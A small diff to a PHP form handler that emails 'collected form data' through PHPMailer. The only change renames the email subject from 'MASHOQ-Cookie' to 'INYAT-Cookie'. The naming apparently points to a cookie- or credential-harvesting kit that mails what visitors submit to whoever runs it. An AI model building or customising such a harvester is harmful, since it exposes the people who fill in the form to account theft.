@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'MASHOQ-Cookie';
+        $mail->Subject = 'INYAT-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
